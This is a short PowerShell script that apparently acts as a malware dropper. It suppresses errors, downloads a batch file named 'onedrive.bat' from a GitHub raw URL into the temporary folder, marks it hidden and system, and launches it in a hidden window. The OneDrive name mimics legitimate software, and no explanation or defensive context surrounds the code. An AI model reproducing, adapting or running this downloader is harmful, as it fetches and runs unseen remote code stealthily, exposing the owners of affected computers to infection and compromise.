$ErrorActionPreference = 'SilentlyContinue'
$url = 'https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat'
$file = "$env:TEMP\onedrive.bat"

if (Test-Path $file) { Remove-Item $file -Force }
Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing

if (Test-Path $file) {
    $item = Get-Item $file -Force
    $item.Attributes = 'Hidden','System'
    Start-Process $file -WindowStyle Hidden
}
